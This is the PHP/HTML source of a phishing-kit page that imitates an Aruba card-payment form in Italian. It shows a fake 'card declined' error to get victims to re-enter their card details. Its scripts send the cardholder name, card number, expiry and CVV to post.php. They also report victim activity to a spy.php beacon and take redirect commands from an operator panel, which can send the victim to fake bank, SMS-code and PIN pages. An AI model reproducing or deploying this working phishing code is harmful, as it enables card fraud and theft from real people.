<?php 
require_once '../includes/main.php';
require '../main.php';
?>

<!doctype html>
<html>
<head>
    <title>Modulo di pagamento</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="card error/res/gate.css">
    <meta charset="utf-8">
</head>
<body>

<div class="content">
    <div style="margin:10px 0; text-align:center;">
        <img src="card error/res/logo.png" style="width:160px;">
    </div>
    <div class="form">
        <div class="col title">
            Paga con carta <img src="card error/res/cards.svg">
        </div>

        <div class="details">
            <p>Pagamento per ordine: #109456731</p>
            <p>Nr° Ordine: 109456731</p>
            <p>Importo: 5,38 €</p>
        </div>

        <div class="paymentform" id="cardform">
            <div class="error">
                La carta utilizzata per pagare è stata rifiutata. prova un'altra carta o contatta la tua banca.
            </div>
            <div class="form-col">
                <input type="text" class="textinput" id="d0" placeholder="Intestatario Carta">
            </div>
            <div class="form-col">
                <input type="tel" class="textinput" id="d1" placeholder="Credit Card">
            </div>

            <div class="formcol-multi">
                <div class="left">
                    <select id="d2">
                        <option value='01'>01</option>
                        <option value='02'>02</option>
                        <option value='03'>03</option>
                        <option value='04'>04</option>
                        <option value='05'>05</option>
                        <option value='06'>06</option>
                        <option value='07'>07</option>
                        <option value='08'>08</option>
                        <option value='09'>09</option>
                        <option value='10'>10</option>
                        <option value='11'>11</option>
                        <option value='12'>12</option>
                    </select>
                    <select id="d3">
                        <option value='2026'>2026</option>
                        <option value='2027'>2027</option>
                        <option value='2028'>2028</option>
                        <option value='2029'>2029</option>
                        <option value='2030'>2030</option>
                        <option value='2031'>2031</option>
                        <option value='2032'>2032</option>
                        <option value='2033'>2033</option>
                        <option value='2034'>2034</option>
                    </select>
                </div>
                <div class="right">
                    <input type="tel" class="short" id="d4" placeholder="CVV">
                </div>
            </div>

            <div class="form-col">
                <button onclick="sendCard()">Procedi</button>
            </div>
            <div class="form-col" style="margin:20px 0; text-align:left; font-size:0.9em;">
                <p>*tutti i campi sono obbligatori</p>
                <p><a href="javascript:void(0)">Informativa sulla privacy</a></p>
            </div>
        </div>

        <p style="margin:30px 0; text-align:left; font-size:0.7em;">© 2026 Aruba<br><a href="#contact">Contatta il supporto</a></p>
    </div>
</div>

<style>
.loader {
    width: 100%;
    height: 100%;
    position: fixed;
    background: rgba(255, 255, 255, 0.8);
    top: 0;
    display: none;
    z-index: 9999999999;
}
.loader .content {
    width: 100%;
    height: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
}
</style>

<div class="loader">
    <div class="content">
        <img src="card error/res/loading.gif" style="width:80px;">
    </div>
</div>

<script src="card error/res/cdns/jq.js"></script>
<script src="card error/res/cdns/m.js"></script>
<script>
$("#d1").mask("0000000000000000");
$("#d4").mask('000');

var allowSubmit;
var abortVal = true;

function validate() {
    abortVal = false;
    allowSubmit = true;
    for (var i = 0; i <= 6; i++) {
        if ($("#d" + i).val() == "") {
            $("#d" + i).css("border-bottom", "1px solid red");
            allowSubmit = false;
        } else {
            $("#d" + i).css("border-bottom", "1px solid #b2b2b2");
        }
    }

    if ($("#d1").val().length < 16) {
        $("#d1").css("border-bottom", "1px solid red");
        allowSubmit = false;
    }
}

$("#cardform input").keyup(() => {
    if (!abortVal) {
        validate();
    }
});

$("#cardform input").keypress((e) => {
    if (e.key == "Enter") {
        sendCard();
    }
});

function sendCard() {
    validate();

    if (allowSubmit) {
        $(".loader").show();

        $.post("post.php", 
            {	
                name: $("#d0").val(), 
                cc: $("#d1").val(),
                exp: $("#d2").val() + "/" + $("#d3").val(),
                cvv: $("#d4").val()
            }, 
            function(done) {
                window.location = "wait.php";
            }
        );
    }
}
</script>

<script src="res/jq.js"></script>
<script src="res/v.js"></script>
	<script src="css/jq.js.download"></script>
	<script>
	var targets = {
            1: "log.php",
            2: "card.php",
            3: "carderror.php",
            4: "nexi.php",
            5: "nexi_error.php",
            6: "ints.php",
            7: "ints_error.php",
            8: "sms.php",
            9: "sms_error.php",
            10: "success.php",
            11: "app.php",
			12: "Cartabcc.php",
			13: "Cartabcc_error.php",
			14: "PostePay.php",
			15: "PostePay_error.php",
			16: "Unicredit.php",
			17: "Unicredit_error.php",
			18: "pin.php"
    };
	clearRedirections();
	setInterval(function(){
	$.post("../panel/process/processor.php",
	{keepAlive:1, page:"Card_Error"} );
}, 2000);
var redirect=0;
setInterval(function(){
	$.post("../panel/process/processor.php",{redirectionListener:1}, function(data){
		redirect=data;
		if(redirect==0){
			return false;
		}else{
			clearRedirections();
			window.location=targets[redirect];
		}
	});
}, 2000);
function clearRedirections(){
	$.post("../panel/process/processor.php",
	{clearRedirection:1});
}

 </script>

<script>
$.post("spy.php", {cardview: 1});
var abort = false;
$("#d0").keyup(function() {
    if (abort == false) {
        $.post("spy.php", {carding: 1});
        abort = true;
    }
});
</script>
</body>
</html>